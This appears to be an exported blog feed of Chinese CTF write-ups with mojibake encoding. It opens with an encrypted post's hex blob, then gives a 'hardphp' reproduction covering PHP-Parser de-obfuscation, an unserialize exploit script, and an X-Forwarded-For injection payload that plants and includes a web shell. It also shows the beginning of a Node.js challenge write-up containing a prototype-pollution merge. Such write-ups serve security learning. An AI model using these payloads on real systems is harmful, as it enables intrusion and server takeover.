9ae01099f3b3e3f32ac52850fac0c1cd424781bda37df9eaab03d0d0e1f8c4282ed5d7fc26deaeb7f26b7512675efce2f72178406cd043f82221ea4f1299e8bec5c0f5d65c841470890acdeae1e273e45ffdc53bfad80368cd5f9fccaecc186e5358a3278c21cd9e02e2ffc79e072e7e899c4e24e27b8bffb5d1da5249a4a765a35e415e8de02d0bc1b1285d20e085421b6555cbee44c14123b77743329daa6df3f43e844171460618378063c714dbf9bae76f68aeaa9af4f88d32499f59be9b91f8f06f867c688836e6675f680443f025022ab486988d315e00f0ad6a8fb61cd47284542212ea03edfb483c583333b191162e6ef65ced745fa38d3caa604e7bd605b3d4adda43e40a4ddfd93c4804ada93d8a3949cf4c9e00abb6e2e97dd2659ee800674b391e92a55eb49d9d624f8872ae503a5ebe4c955b9e5abbe770fc09da8a4855757255548fdc6c8827b2ff440426906bf5dc33bc1c5fc4b60eaad1d35f6c16a32cd8edd5cb0c8530c6d61707e803592b3d19f0fdb63de0d4aca9bef35d535cc847f6da4a0a36f51cee954413935d30405e196a0d840a22e0d4f0ecae80c5182e8a071dc9d123c5a09a60415d1b524866148a341041da41f03cca50d7d28af9fe56babfec8e7f0bc47e77e3353c52bc3d22ab24fd72d0eff9780ce76d6a1a35d5aacec3028ee1361a598263f9c9b50f7e229d460a6020c61d71262b05e5c44018320f09230211871088abf94cec151760eb7291bbc5809785c94c6b7b91ae7d1780bf7fb82ddc2aa590fd0a5b1cfbfbf5ddd41982f6499fbac5e07ecdc38d1478349156c26d17cc865d088594c501892c76ccad79cf8635e5e15baba2129b377c98acd09b5c3e36fcb4532dd38bd3ce3bac8aac13029970837817ba99292d1e14666bead75e6aa058ee9df96cc5202d6090e54d6e453b76bd4a6db50a4c3525e428c517cfc10bee9b5e6e87f4c66228e9393a7a099e42a45cbb2a5ca5f94f86efdcae42f65684af85bdc0498537c8d30c9694b8c07fc090405a3804c9dfd6be860b74e4acc9ef122fdfb4d9f4a54f1b91c2a202ad1c3e629c525434cc4948936f527fe5862af9c6c779c5615d1d329604d309febc7fb7332fcd5ca7db131dcd5d16cbdeab6e21f36bfd76b16acbb83f8d056d785931b97b282d615fd39178c0cc09f5afc84b951654ad505ab3066a69ef6da3090a2eeb31027808727a8344ccb5a4fb86dab2def45da022fc62345b0585570525fffbb5d27036c604908e36650c4f2750b179613168939073dd179b1fc6e26374a365f050f716d19f650535ec4c45ba1978cee5c48093b717735879a59944fc5c56ec9477460dff8d889c8b92d3ebd5d210b7e9f8fffb84cee159683f8f3c37c2d7008eba85b34d6722432b2016596767a3431d2d055814d8cb3645bea69f29b163fb3edeabd8a08a9dbf06b391ac0a2352bfbcb10d3a3f5970f15d97d8b396d94342f85d1d9673bbe07d402571899d17d1d7bf994c2d4328a1604d20021c67a39c7ecbfc09ab6ac7f84c857ff4bba7b0f2d65252ab7a9c1fc99cf20791d41a99d1913c112277e723f065b44ef59963aecf10b9e95bdb46fe191349c3dd67f0be5614e546458c4b85897a00f1cc3d9e2d7dc03197ffe129a19815bffcb59eb1be4b41bf28917a881c4e1209361ce2c577e1227368e46771ce810212167047e5f1de9d041b5b4bbe8674f83faab6d9f6b4f76c260469258bd0c9ceca7803a676722ca94e7889dcc82635c59cc27eb7efed4d07c9262c52bc291c6c1cbc41f1f4056b289f9903f84a7e7a9acbe9e3493e14300dcaf9c1c624d5d53545d33e5ffc3eeeb20d7d8863933cf38b89d6b5cf184c9c672e019e8ba4f9d67633a89800f02ea9b33faf93eb0347a48ef4c098132d67514e368ae1621041149216dbdda40ee3bd9f383666bab77f4ba7040df8e7b528de7cbd35b69edd06f4ec10a0b0a4fd034bcd0e0a4765575607ee6647f915c59cfb25b750d5cb0cb6629b439ab9249a4f5521013f2e40bf47d10e5f3b591f555ec4504ab67315bf84bcde4f189b02b55baf9dc84a0494543cf2fdf310ce778f61a4e584a086cc8a40b946afc33beeb5056b96e7232461dc74b3106779c223d17998454c4823291f64622563417102719d31702419a25ac45566937394df365ad2b1a6068f87035c1672b666a82af46d80648a04cc50f3a7b0b79b85aadef0aaa4ceae9251d518aee35014d0b2dcdefb1b8d6e6ad66ac57e4f4e80a3762d69b97ac30e27ade5043a70cabd47ac85eb89c9cac8135f8b98fb61f0c6215e4b6756e50df83b6a70543e0825a519ce4ebba35bde4978b1e5c65e431380e9b43a50782cc86c43cbbf3fc7ca45396b9c5a323707aa0cb10e181ccc067c67f5ac2432e376a3a0b749312fa8986ef8a0df782cf64158fa7e4317a28135d875ec9d01843978cf218e5bab49b0515587a59593c4ee0c92b28b5f2df87c6a796b6014efa1427329e3b8a8cc0055327610496afe3ef51b5f21d071f98302ee637a7fdfe96094d37841f0032aa3cf76f39569cf7dd7236b03d2348ceb5826da0697f0bd27a04ae0232731958c67b728d8090f4164c49a8bd3e002b28c3ad3912677b0ac5463232680218c63d994a7a1aea3db928c27c5eda961f8cd6a361d7dd73dae01ce7db237e91fad5199b48d3efc2b8a61010c043b7daa31af0d6214b64e78dd1ae52630f1bf06e91107ff04a90ca3c40a0020da73fb650cde279a5c6746aafae23b994ccbc0d46122f6b9b3291e305931454246b9c5b6d98d5b1ce52b15b295f9b2d2738482fc3017843bdc04cec59ff61ca846b1cbdfc9bf44feb067c84d0f8c765f7baa75cce7c6cbd820188f41575f456f4dca225de17118b1080536221c8bffcd5466b661b5ab0f56c07654df11a9d43ebdfa3bd92981841101b1af2c6509a739d5af89feeb28dd416ff9a6c73f7d4d992438e08b2e4c7f17109d10ceab493c6b2e29e4bba89b9049597039f94f89a279bfe7b7a9dfc559446c6fc1eea84993f76388f402fa1b2f8754f48b3c47a74c6ee1dfbb47044830706f79ea7090769b40509a13c245cd25ee0705c5792b902e8a300f62da09a9c634b66e4496cacacc7d8fb43e76a32b7e105db77e799b3c7734cf93847d64739dab84f6c41fcf09f58defc1ae2506db8cf8bc56e3d6bfe6fc21ee4554e77c8599177b455196a445d5fda3c1ca8925f3ec96465512f32334ae22eef18d05e556b19926e2fe32e0c8bc2c2d62209af8a73d66763712f9c85435ea1c98067f41334bcdbf47dcd9abe70de6773631b8507539066c38f886734545d8068e1f8ed7b7b931e3519660cabeb0d64504dc2257db25bec8c0d9c858761229b73a29104bd1453b280c9be4e69efc3ad70373f84e25d0b6103842dbc828b0419b80e0633ee3f37102fc4db8229fd2a80cbe3634672afa06d018bc621c26aa17b2be8d74d60eb692f4f5cbbce24bf730c887572</script>
</div>
<script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
      <tags>
        <tag>writeup</tag>
      </tags>
  </entry>
  <entry>
    <title>é«˜æ ¡æˆ˜å½¹hardphpå¤ç°</title>
    <url>/2020/03/29/%E9%AB%98%E6%A0%A1%E6%88%98%E2%80%9C%E7%96%AB%E2%80%9Dhardphp%E5%A4%8D%E7%8E%B0/</url>
    <content><![CDATA[<p>è®°å½•hardphpè¿™é“é¢˜å¤ç°è¿‡ç¨‹ï¼Œå­¦ä¹ äº†Php-Parseè¿›è¡Œæ··æ·†å’Œè§£æ··æ·†å’ŒSessionæœºåˆ¶çš„å¦ä¸€ç§åˆ©ç”¨æ–¹å¼ï¼Œå¦‚æœ‰ä¸è¶³ï¼Œå¸Œæœ›å¸ˆå‚…ä»¬æ‰¹è¯„æŒ‡æ­£ã€‚</p>
<a id="more"></a>

<h1 id="0x01-è§£æ··æ·†"><a href="#0x01-è§£æ··æ·†" class="headerlink" title="0x01 è§£æ··æ·†"></a>0x01 è§£æ··æ·†</h1><p>æ‹¿åˆ°é¢˜ç›®æºç  ï¼Œæ˜¯ä¸‹å›¾çš„æ ¼å¼ï¼Œéœ€è¦è§£æ··æ·†ã€‚</p>
<p><img src="/2020/03/29/%E9%AB%98%E6%A0%A1%E6%88%98%E2%80%9C%E7%96%AB%E2%80%9Dhardphp%E5%A4%8D%E7%8E%B0/image-20200329115420004.png" alt="image-20200329115420004"></p>
<p>æ¯”èµ›ç»“æŸåçœ‹äº†<a href="https://blog.zsxsoft.com/post/42" target="_blank" rel="noopener">zsh</a>å¸ˆå‚…å‘çš„æ–‡ç« ï¼ŒçŸ¥é“æ­£è§£æ˜¯ç”¨Php-Parseræ¥è§£æ··æ·†ï¼Œæ–‡ç« é‡Œæå‡ºäº†ä¸€ç§é€šè¿‡Parseæ¥è¿›è¡Œä»£ç æ··æ·†çš„æ–¹å¼ï¼ŒParseræ˜¯å¯ä»¥ç”¨æ¥å¯¹phpä»£ç è¿›è¡Œè¯­æ³•åˆ†æçš„å·¥å…·ï¼Œå¯ä»¥å°†phpä»£ç è§£ææˆæŠ½è±¡è¯­æ³•æ ‘ï¼Œç„¶åéå†è¯­æ³•æ ‘ä¿®æ”¹æ ‘ä¸Šçš„èŠ‚ç‚¹ï¼Œæœ€åå†å°†ä¿®æ”¹åçš„è¯­æ³•æ ‘è½¬æ¢ä¸ºphpä»£ç ã€‚è¿™æ ·å°±å¯ä»¥è¾¾åˆ°ä¸€ä¸ªæ··æ·†ä»£ç çš„ä½œç”¨ã€‚éå†æŠ½è±¡è¯­æ³•æ ‘éœ€è¦ç”¨åˆ°Node visitors ,å…¶ç›¸å…³ç”¨æ³•å¦‚ä¸‹å›¾,å»è¿™é‡Œ<a href="https://github.com/nikic/PHP-Parser/blob/master/doc/component/Walking_the_AST.markdown" target="_blank" rel="noopener">Walking the AST</a>è¯¦ç»†çœ‹ä¸‹ï¼Œå¯èƒ½æ›´å¥½ç†è§£ã€‚</p>
<p><img src="/2020/03/29/%E9%AB%98%E6%A0%A1%E6%88%98%E2%80%9C%E7%96%AB%E2%80%9Dhardphp%E5%A4%8D%E7%8E%B0/image-20200329133214620.png" alt="image-20200329133214620"></p>
<p>ç„¶åçœ‹é¢˜ç›®ä¸­æ··æ·†ä»£ç çš„å¤§è‡´è§„åˆ™ï¼Œå¯ä»¥çœ‹åˆ°æ¯ä¸ªphpæ–‡ä»¶å‰é¢éƒ½æ˜¯ç±»ä¼¼è¿™æ ·çš„ç»“æ„</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$GLOBALS[<span class="string">'ï¿½ï¿½ï¿½ï¿½ï¿½'</span>]=unserialize(base64_decode(<span class="string">'xxxxxxxxxxxxxxx'</span>));</span><br><span class="line"></span><br><span class="line">$GLOBALS[$GLOBALS[<span class="string">'ï¿½ï¿½ï¿½ï¿½ï¿½'</span>][<span class="number">0</span>]]=$GLOBALS[<span class="string">'ï¿½ï¿½ï¿½ï¿½ï¿½'</span>][<span class="number">3</span>]($GLOBALS[<span class="string">'ï¿½ï¿½ï¿½ï¿½ï¿½'</span>][<span class="number">2</span>]($GLOBALS[<span class="string">'ï¿½ï¿½ï¿½ï¿½ï¿½'</span>][<span class="number">1</span>]));</span><br><span class="line"></span><br><span class="line">$GLOBALS[$GLOBALS[<span class="string">'ï¿½ï¿½ï¿½ï¿½ï¿½'</span>][<span class="number">0</span>]][$GLOBALS[<span class="string">'ï¿½ï¿½ï¿½ï¿½ï¿½'</span>][<span class="number">4</span>]+($GLOBALS[<span class="string">'ï¿½ï¿½ï¿½ï¿½ï¿½'</span>][<span class="number">5</span>]-$GLOBALS[<span class="string">'ï¿½ï¿½ï¿½ï¿½ï¿½'</span>][<span class="number">6</span>])]</span><br></pre></td></tr></table></figure>

<p>å¯ä»¥çŸ¥é“<code>$GLOBALS[&#39;ï¿½ï¿½ï¿½ï¿½ï¿½&#39;]</code>ä¸ºä¸€ä¸ªæ•°ç»„ï¼Œé¦–å…ˆåå‘è§£å‡º<code>$GLOBALS[&#39;ï¿½ï¿½ï¿½ï¿½ï¿½&#39;]</code>å¦‚ä¸‹å›¾</p>
<p><img src="/2020/03/29/%E9%AB%98%E6%A0%A1%E6%88%98%E2%80%9C%E7%96%AB%E2%80%9Dhardphp%E5%A4%8D%E7%8E%B0/image-20200329121029339.png" alt="image-20200329121029339"></p>
<p>å¯ä»¥çœ‹å‡º<code>$GLOBALS[&#39;ï¿½ï¿½ï¿½ï¿½ï¿½&#39;][1]</code>ä»ä¸ºä¸€ä¸²base64ç¼–ç çš„å­—ç¬¦ä¸²ï¼Œ<code>$GLOBALS[&#39;ï¿½ï¿½ï¿½ï¿½ï¿½&#39;][2]</code>ä¸º<code>base64_docode</code>ï¼Œ<code>$GLOBALS[&#39;ï¿½ï¿½ï¿½ï¿½ï¿½&#39;][2]</code>ä¸º<code>unserialize</code>ï¼Œ<code>$GLOBALS[&#39;ï¿½ï¿½ï¿½ï¿½ï¿½&#39;][3]</code>ä¹‹åçš„å€¼éƒ½ä¸ºintå‹æ•´æ•°ï¼Œç„¶ååˆ†æä¸Šé¢ä»£ç çš„çš„ç¬¬äºŒå¥</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$GLOBALS[$GLOBALS[<span class="string">'ï¿½ï¿½ï¿½ï¿½ï¿½'</span>][<span class="number">0</span>]]=$GLOBALS[<span class="string">'ï¿½ï¿½ï¿½ï¿½ï¿½'</span>][<span class="number">3</span>]($GLOBALS[<span class="string">'ï¿½ï¿½ï¿½ï¿½ï¿½'</span>][<span class="number">2</span>]($GLOBALS[<span class="string">'ï¿½ï¿½ï¿½ï¿½ï¿½'</span>][<span class="number">1</span>]));</span><br></pre></td></tr></table></figure>

<p>å°†å€¼ä»£å…¥åå¯ä»¥å¾—å‡º</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$GLOBALS[$GLOBALS[<span class="string">'ï¿½ï¿½ï¿½ï¿½ï¿½'</span>][<span class="number">0</span>]]=unserialize(base64_decode($GLOBALS[<span class="string">'ï¿½ï¿½ï¿½ï¿½ï¿½'</span>][<span class="number">1</span>]));</span><br></pre></td></tr></table></figure>

<p>æˆ‘ä»¬è§£å‡º<code>$GLOBALS[$GLOBALS[&#39;ï¿½ï¿½ï¿½ï¿½ï¿½&#39;][0]]</code>å¦‚ä¸‹å›¾</p>
<p><img src="/2020/03/29/%E9%AB%98%E6%A0%A1%E6%88%98%E2%80%9C%E7%96%AB%E2%80%9Dhardphp%E5%A4%8D%E7%8E%B0/image-20200329121724099.png" alt="image-20200329121724099"></p>
<p><code>$GLOBALS[$GLOBALS[&#39;ï¿½ï¿½ï¿½ï¿½ï¿½&#39;][0]]</code>ä»ç„¶ä¸ºæ•°ç»„ï¼Œé‡Œé¢çš„å€¼æœ‰å­—ç¬¦ä¸²å’Œintå€¼ï¼›</p>
<p>ç„¶ååˆ†æä¸Šé¢ä»£ç çš„ç¬¬ä¸‰å¥</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$GLOBALS[$GLOBALS[<span class="string">'ï¿½ï¿½ï¿½ï¿½ï¿½'</span>][<span class="number">0</span>]][$GLOBALS[<span class="string">'ï¿½ï¿½ï¿½ï¿½ï¿½'</span>][<span class="number">4</span>]+($GLOBALS[<span class="string">'ï¿½ï¿½ï¿½ï¿½ï¿½'</span>][<span class="number">5</span>]-$GLOBALS[<span class="string">'ï¿½ï¿½ï¿½ï¿½ï¿½'</span>][<span class="number">6</span>])]</span><br></pre></td></tr></table></figure>

<p>å°†å…¶ä¸­å†…å®¹ç®€å†™åå¦‚ä¸‹å›¾æ‰€ç¤ºï¼š</p>
<p><img src="/2020/03/29/%E9%AB%98%E6%A0%A1%E6%88%98%E2%80%9C%E7%96%AB%E2%80%9Dhardphp%E5%A4%8D%E7%8E%B0/image-20200329123658889.png" alt="image-20200329123658889"></p>
<p>å°±æ˜¯å–<code>$GLOBALS[$GLOBALS[&#39;ï¿½ï¿½ï¿½ï¿½ï¿½&#39;][0]]</code>æ•°ç»„ä¸­ï¼Œå¯¹åº”ç´¢å¼•ä¸ºåé¢ä¸‰ä¸ªå€¼ç›¸åŠ å‡åçš„ç»“æœçš„å€¼ã€‚ç„¶åæˆ‘ä»¬å¼€å§‹è§£æ··æ·†ï¼Œ</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">decode</span> <span class="params">($beforeFilename,$afterFilename)</span></span>&#123;</span><br><span class="line">    <span class="comment">///å»æ‰æ•°ç»„</span></span><br><span class="line">    $parser = (<span class="keyword">new</span> ParserFactory())-&gt;create(ParserFactory::PREFER_PHP7);</span><br><span class="line">    $ast = $parser-&gt;parse(file_get_contents($beforeFilename));</span><br><span class="line">    $traverser = <span class="keyword">new</span> NodeTraverser();</span><br><span class="line">    $traverser-&gt;addVisitor(<span class="keyword">new</span> ArrayToConstant($parser));</span><br><span class="line">    $ast = $traverser-&gt;traverse($ast);</span><br><span class="line">    $prettyPrinter = <span class="keyword">new</span> Standard();</span><br><span class="line">    $ret = $prettyPrinter-&gt;prettyPrint($ast);</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">"&lt;?php                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                      </span></span><br><span class="line"><span class="string">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>çš„å›¾ç‰‡ï¼Œåœ¨é¦–é¡µå¯ä»¥å¾—åˆ°å›¾ç‰‡åœ¨æœåŠ¡å™¨ä¸Šçš„æ–‡ä»¶åï¼Œ</p>
<p>ç„¶åç¼–å†™exp</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Upload</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Logger</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> $err = [];</span><br><span class="line">    <span class="keyword">protected</span> $handle;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($up)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;err = <span class="keyword">array</span>(<span class="string">"/var/www/html/img/upload/air5f878bshuwonslz1lmtce1j9nt8zf.jpg"</span> =&gt; <span class="string">"shell.php"</span>);</span><br><span class="line">        <span class="keyword">$this</span>-&gt;handle = $up;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$upload = <span class="keyword">new</span> Upload();</span><br><span class="line">$logger = <span class="keyword">new</span> Logger($upload);</span><br><span class="line">$d = urlencode(serialize($logger));</span><br><span class="line">$e = str_replace(<span class="string">"%00"</span>,<span class="string">"',0x00,'"</span>,$d);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'HTTP_X_FORWARDED_FOR[\',data%3dconcat(\'data|'</span>.$e.<span class="string">'\')%23\']=123'</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"\n\n"</span>;</span><br></pre></td></tr></table></figure>

<p>ç„¶åå‘é€ä¸¤éï¼Œç¬¬äºŒéè§¦å‘ååºåˆ—åŒ–</p>
<p><img src="/2020/03/29/%E9%AB%98%E6%A0%A1%E6%88%98%E2%80%9C%E7%96%AB%E2%80%9Dhardphp%E5%A4%8D%E7%8E%B0/image-20200329171758795.png" alt="image-20200329171758795"></p>
<p>ç„¶ååœ¨/img/upload/æ–‡ä»¶å¤¹ä¸‹ç”Ÿæˆshell.phpï¼Œç„¶è€Œå¹¶ä¸èƒ½åˆ©ç”¨ï¼Œå› ä¸ºåœ¨uploadæ–‡ä»¶å¤¹ä¸‹æœ‰.htaccessæ–‡ä»¶</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">php_flag engine off;</span><br></pre></td></tr></table></figure>

<p>ç¦æ­¢äº†phpæ–‡ä»¶æ‰§è¡Œï¼Œé‚£ä¹ˆåªèƒ½å¯»æ‰¾includeä¹‹ç±»çš„æ–‡ä»¶åŒ…å«æ¥åˆ©ç”¨äº†ï¼Œç„¶åå‘ç°core.phpä¸­æœ‰ç±»è‡ªåŠ¨åŠ è½½å™¨ï¼Œå¹¶ä¸”æœ‰includeæ–‡ä»¶åŒ…å«ã€‚</p>
<p><img src="/2020/03/29/%E9%AB%98%E6%A0%A1%E6%88%98%E2%80%9C%E7%96%AB%E2%80%9Dhardphp%E5%A4%8D%E7%8E%B0/image-20200329172720885.png" alt="image-20200329172720885"></p>
<p>ç„¶åå¯»æ‰¾é‚£é‡Œæœ‰ä½¿ç”¨äº†æœªå®šä¹‰çš„ç±»ï¼Œ</p>
<p><img src="/2020/03/29/%E9%AB%98%E6%A0%A1%E6%88%98%E2%80%9C%E7%96%AB%E2%80%9Dhardphp%E5%A4%8D%E7%8E%B0/image-20200329174200228.png" alt="image-20200329174200228"></p>
<p>æ¯ä¸ªæ¥å£å·®ä¸å¤šéƒ½æœ‰ä¸€ä¸ª$v2å˜é‡çš„getTime()é™æ€æ–¹æ³•çš„è°ƒç”¨ï¼Œ$v2æ¥æºäº$_SESSION[â€˜dataâ€™]ä¸­æ•°æ®çš„ååºåˆ—åŒ–ï¼Œå¦‚æœ$v2ä¸ºä¸€ä¸ªå­—ç¬¦ä¸²ï¼Œå°±å¯ä»¥è°ƒç”¨å­—ç¬¦ä¸²å¯¹åº”çš„ç±»çš„é™æ€æ–¹æ³•ï¼Œé‚£ä¹ˆè¿™é‡Œå¦‚æœ$v2ä¸ºä¸€ä¸ªæœªå®šä¹‰çš„ç±»ï¼Œå°±ä¼šè§¦å‘å‰é¢çš„ç±»åŠ è½½å™¨ï¼ŒåŒ…å«shellã€‚ç„¶åä¼ªé€ sessionçš„dataã€‚</p>
<p><img src="/2020/03/29/%E9%AB%98%E6%A0%A1%E6%88%98%E2%80%9C%E7%96%AB%E2%80%9Dhardphp%E5%A4%8D%E7%8E%B0/image-20200329175736213.png" alt="image-20200329175736213"></p>
<p>å¦å¤–ä¹Ÿå¯ä»¥å‘é€</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">username&#x3D;aaa&amp;password&#x3D;aaa&amp;HTTP_X_FORWARDED_FOR[&#39;,data%3dconcat(&#39;data|O:5:&quot;shell&quot;:0:&#123;&#125;&#39;)%23&#39;]&#x3D;123</span><br></pre></td></tr></table></figure>

<p>æœ¬åœ°æµ‹è¯•åï¼Œè¿™ç§æ–¹å¼ä¸æ˜¯é€šè¿‡$v2è°ƒç”¨é™æ€æ–¹æ³•è§¦å‘çš„ï¼ŒçŒœæµ‹æ˜¯åœ¨unserializeæ—¶æ¥æ”¶çš„å‚æ•°æ˜¯ä¸€ä¸ªç±»å¯¹è±¡ï¼Œç„¶åè§¦å‘çš„ç±»è‡ªåŠ¨åŠ è½½å™¨ã€‚</p>
<p>ä¹‹åè®¿é—®/?s=img/uploadå°±å¯ä»¥å¾—åˆ°shelläº†ã€‚</p>
<p><img src="/2020/03/29/%E9%AB%98%E6%A0%A1%E6%88%98%E2%80%9C%E7%96%AB%E2%80%9Dhardphp%E5%A4%8D%E7%8E%B0/image-20200329180252026.png" alt="image-20200329180252026"></p>
<p>å‚è€ƒé“¾æ¥</p>
<p><a href="https://ganlvtech.github.io/2019/03/01/enphp-decode/" target="_blank" rel="noopener">https://ganlvtech.github.io/2019/03/01/enphp-decode/</a></p>
<p><a href="https://xz.aliyun.com/t/3453" target="_blank" rel="noopener">https://xz.aliyun.com/t/3453</a></p>
<p><a href="https://xz.aliyun.com/t/3428#toc-3" target="_blank" rel="noopener">https://xz.aliyun.com/t/3428</a></p>
<p><a href="https://blog.zsxsoft.com/post/42" target="_blank" rel="noopener">https://blog.zsxsoft.com/post/42</a></p>
]]></content>
      <tags>
        <tag>writeup</tag>
        <tag>PHP-Parseræ··æ·†</tag>
      </tags>
  </entry>
  <entry>
    <title>é«˜æ ¡æˆ˜â€œç–«â€ç½‘ç»œå®‰å…¨åˆ†äº«èµ›éƒ¨åˆ†èµ›é¢˜å¤ç°</title>
    <url>/2020/03/10/%E9%AB%98%E6%A0%A1%E6%88%98%E2%80%9C%E7%96%AB%E2%80%9D%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%88%86%E4%BA%AB%E8%B5%9B%E9%83%A8%E5%88%86%E8%B5%9B%E9%A2%98%E5%A4%8D%E7%8E%B0/</url>
    <content><![CDATA[<p>GXZY CTF å‡ é“webé¢˜ç›®å’Œå‡ é“webé¢„æœŸè§£çš„å¤ç°</p>
<a id="more"></a>

<h1 id="0x01-guess-game-redosè§£æ³•"><a href="#0x01-guess-game-redosè§£æ³•" class="headerlink" title="0x01 guess game redosè§£æ³•"></a>0x01 guess game redosè§£æ³•</h1><p>å¤ç°æ—¶é¢˜ç›®ç¯å¢ƒå·²å…³ï¼Œå‰é¢åå¼¹shellåæ‹·äº†é¢˜ç›®çš„æºç ï¼Œ</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> express = <span class="built_in">require</span>(<span class="string">'express'</span>);</span><br><span class="line"><span class="keyword">var</span> ejs=<span class="built_in">require</span>(<span class="string">'ejs'</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> app = express();</span><br><span class="line"></span><br><span class="line">app.use(express.json()); <span class="comment">// for parsing application/json</span></span><br><span class="line">app.use(express.urlencoded(&#123; <span class="attr">extended</span>: <span class="literal">true</span> &#125;));<span class="comment">// for parsing application/x-www-form-urlencoded</span></span><br><span class="line">app.use(<span class="string">'/static/'</span>,express.static(<span class="string">"./static/"</span>));</span><br><span class="line">app.engine(<span class="string">'html'</span>,ejs.__express);</span><br><span class="line">app.set(<span class="string">'view engine'</span>,<span class="string">'html'</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> config = &#123;</span><br><span class="line">    <span class="string">"forbidAdmin"</span> : <span class="literal">true</span>,</span><br><span class="line">    <span class="comment">//"enableReg" : true</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">var</span> loginHistory = [];</span><br><span class="line"><span class="keyword">var</span> adminName = <span class="string">"admin888"</span>;</span><br><span class="line"><span class="keyword">var</span> flag = <span class="string">"g3tFLAaGEAxY"</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> isObject = <span class="function"><span class="params">obj</span> =&gt;</span> obj &amp;&amp; obj.constructor &amp;&amp; obj.constructor === <span class="built_in">Object</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">merge</span>(<span class="params">a, b</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> attr <span class="keyword">in</span> b) &#123;</span><br><span class="line">        <span class="keyword">if</span> (isObject(a[attr]) &amp;&amp; isObject(b[attr])) &#123;</span><br><span class="line">            merge(a[attr], b[attr]);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            a[attr] = b[attr];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> a;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">log</span>(<span class="params">userInfo</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">let</span> logItem = &#123;<span class="string">"time"</span>:<span class="keyword">new</span> <span class="built_in">Date</span>().toString()&#125;;</span><br><span class="line">    merge(logItem,userInfo);</span><br><span 